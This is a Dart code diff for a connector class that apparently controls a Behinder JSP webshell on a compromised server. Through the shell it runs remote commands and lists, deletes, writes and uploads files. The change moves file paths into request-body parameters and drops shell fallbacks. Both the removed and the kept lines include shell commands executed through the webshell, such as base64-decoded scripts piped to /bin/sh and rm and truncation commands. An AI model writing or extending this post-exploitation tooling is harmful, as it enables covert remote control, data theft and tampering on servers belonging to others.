@@ -227,27 +227,13 @@ class JspBehinderConnector extends ShellConnector {
 
   static bool _hasNonAscii(String s) => s.codeUnits.any((c) => c > 127);
 
-  /// Tomcat 等整请求头约 8KB；路径 Base64 过长则无法安全放进头里，需回退 exec。
-  static const _kMaxPathB64HeaderChars = 6000;
-
-  /// 纯 ASCII 且较短用 [X-Path]；含非 ASCII 用 [X-Path-B64]（UTF-8 再 Base64）。
-  /// 返回 null 表示应走 shell/exec。
-  static Map<String, String>? _pathHeadersForNative(String path) {
+  /// 构建路径参数（参数在 body 第二行，无长度限制）。
+  /// 含非 ASCII 时用 base64 编码，agent 端自动解码。
+  static Map<String, String> _pathParams(String path) {
     if (_hasNonAscii(path)) {
-      final b64 = base64.encode(utf8.encode(path));
-      if (b64.length > _kMaxPathB64HeaderChars) return null;
-      return {'path_b64': b64};
+      return {'path_b64': base64.encode(utf8.encode(path))};
     }
-    if (path.length > 2048) return null;
     return {'path': path};
-  }
-
-  /// 冰蝎 exec 脚本编码：非 ASCII 时用 base64 包装，经 shell 解码后交给 `/bin/sh`。
-  /// 含中文等时整段脚本 UTF-8→Base64，经 shell 解码后交给 `/bin/sh`（与上传 exec 回退一致）。
-  static String _execScriptForXvHeader(String script) {
-    if (!_hasNonAscii(script)) return script;
-    final b64 = base64.encode(utf8.encode(script));
-    return 'echo ${_sq(b64)}|base64 -d|/bin/sh';
   }
 
   @override
@@ -264,10 +250,9 @@ class JspBehinderConnector extends ShellConnector {
       cd = '';
     }
     final script = '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}';
-    final xv = _execScriptForXvHeader(script);
     final r = await _sendBehinder(
       'exec',
-      extraParams: {'_k': _execKey, _execKey: xv},
+      extraParams: {'_k': _execKey, _execKey: script},
     );
     return r.trim();
   }
@@ -286,25 +271,6 @@ class JspBehinderConnector extends ShellConnector {
         loadSysinfo: getSystemInfo,
         exec: executeCommand,
       );
-
-  /// Shell command that lists [path] in the same pipe-delimited format the
-  /// behinder `ls` action uses: `base64(name)|d_or_f|size|perms|mtime\n`.
-  /// The path is base64-encoded so the exec header stays pure ASCII.
-  String _execLsCmd(String path) {
-    final b64Path = base64.encode(utf8.encode(path));
-    // Linux stat uses -c, macOS stat uses -f — try both with ||.
-    return "_p=\$(echo ${_sq(b64Path)}|base64 -d);"
-        "{ echo '..';ls -a \"\$_p\" 2>/dev/null|grep -vE '^\\.\\.?\$'; }"
-        "|while IFS= read -r n;do"
-        " f=\"\$_p/\$n\";[ -e \"\$f\" ]||continue;"
-        "[ -d \"\$f\" ]&&t=d||t=f;"
-        "s=\$(stat -c%s \"\$f\" 2>/dev/null||stat -f%z \"\$f\" 2>/dev/null||echo 0);"
-        "p=\$(stat -c%A \"\$f\" 2>/dev/null||stat -f%Sp \"\$f\" 2>/dev/null||echo -);"
-        "m=\$(stat -c%y \"\$f\" 2>/dev/null||stat -f%Sm \"\$f\" 2>/dev/null||echo -);"
-        "nb=\$(printf '%s' \"\$n\"|base64|tr -d '\\n');"
-        "printf '%s|%s|%s|%s|%s\\n' \"\$nb\" \"\$t\" \"\$s\" \"\$p\" \"\$m\";"
-        "done";
-  }
 
   List<FileEntry> _parseLsOutput(String result) {
     return result
@@ -341,16 +307,7 @@ class JspBehinderConnector extends ShellConnector {
 
   @override
   Future<List<FileEntry>> listDirectory(String path) async {
-    final String result;
-    final ph = _pathHeadersForNative(path);
-    if (ph != null) {
-      result = await _sendBehinder('ls', extraParams: ph);
-    } else {
-      result = await _sendBehinder(
-        'exec',
-        extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
-      );
-    }
+    final result = await _sendBehinder('ls', extraParams: _pathParams(path));
     if (result.isEmpty ||
         result.startsWith('ERR_OPEN') ||
         result.startsWith('[')) {
@@ -378,13 +335,10 @@ class JspBehinderConnector extends ShellConnector {
 
   @override
   Future<bool> deleteFile(String path) async {
-    final ph = _pathHeadersForNative(path);
-    if (ph != null) {
-      try {
-        final r = await _sendBehinder('rm', extraParams: ph);
-        if (r.trim() == '1') return true;
-      } catch (_) {}
-    }
+    try {
+      final r = await _sendBehinder('rm', extraParams: _pathParams(path));
+      if (r.trim() == '1') return true;
+    } catch (_) {}
     final b64Path = base64.encode(utf8.encode(path));
     final cmd =
         "_p=\$(echo ${_sq(b64Path)} | base64 -d) && rm \"\$_p\" && echo 1 || echo 0";
@@ -437,10 +391,8 @@ class JspBehinderConnector extends ShellConnector {
   static const _kMaxWpartBlockSize = 64 * 1024;
 
   Future<void> _wcloseRemoteFile(String target) async {
-    final ph = _pathHeadersForNative(target);
-    if (ph == null) return;
     try {
-      await _sendBehinder('wclose', extraParams: ph);
+      await _sendBehinder('wclose', extraParams: _pathParams(target));
     } catch (_) {}
   }
 
@@ -454,7 +406,7 @@ class JspBehinderConnector extends ShellConnector {
     if (start >= full.length) return true;
     final end = math.min(start + blockSize, full.length);
     final chunk = full.sublist(start, end);
-    final ph = _pathHeadersForNative(path);
+    final ph = _pathParams(path);
     if (ph == null) return false;
     final r = await _sendBehinder(
       'wpart',
@@ -524,29 +476,27 @@ class JspBehinderConnector extends ShellConnector {
     // exec 回退：路径经 shell base64 解码（与原生头的 X-Path-B64 无关）。
     final b64Target = base64.encode(utf8.encode(target));
 
-    final pathHdr = _pathHeadersForNative(target);
+    final pathParams = _pathParams(target);
     if (total == 0) {
-      if (pathHdr != null) {
-        final r = await _sendBehinder(
-          'write',
-          extraParams: {...pathHdr, 'data': ''},
-        );
-        if (r.trim() == '1') return true;
-      }
+      final r = await _sendBehinder(
+        'write',
+        extraParams: {...pathParams, 'data': ''},
+      );
+      if (r.trim() == '1') return true;
       final cmd =
           "_p=\$(echo ${_sq(b64Target)} | base64 -d) && : > \"\$_p\" && echo 1 || echo 0";
-      final r = await _sendBehinder(
+      final r2 = await _sendBehinder(
         'exec',
         extraParams: {'_k': _execKey, _execKey: cmd},
       );
-      return r.trim().endsWith('1');
+      return r2.trim().endsWith('1');
     }
 
-    if (pathHdr != null && bytes.length <= _kMaxWpartBlockSize) {
+    if (bytes.length <= _kMaxWpartBlockSize) {
       final dataB64 = base64.encode(bytes);
       final r = await _sendBehinder(
         'write',
-        extraParams: {...pathHdr, 'data': dataB64},
+        extraParams: {...pathParams, 'data': dataB64},
       );
       if (r.trim() == '1') {
         onProgress(total, total);
@@ -554,10 +504,8 @@ class JspBehinderConnector extends ShellConnector {
       }
     }
 
-    if (pathHdr != null) {
-      final ok = await _writeFileBinaryWpart(target, bytes, onProgress);
-      if (ok) return true;
-    }
+    final ok = await _writeFileBinaryWpart(target, bytes, onProgress);
+    if (ok) return true;
 
     int offset = 0;
     bool first = true;
@@ -613,16 +561,7 @@ class JspBehinderConnector extends ShellConnector {
   Future<List<({String name, bool isDir})>> listNamesForCompletion(
     String path,
   ) async {
-    final String result;
-    final ph = _pathHeadersForNative(path);
-    if (ph != null) {
-      result = await _sendBehinder('ls', extraParams: ph);
-    } else {
-      result = await _sendBehinder(
-        'exec',
-        extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
-      );
-    }
+    final result = await _sendBehinder('ls', extraParams: _pathParams(path));
     if (result.isEmpty || result.startsWith('[')) return [];
     final out = <({String name, bool isDir})>[];
     for (final line in result.trim().split('\n')) {
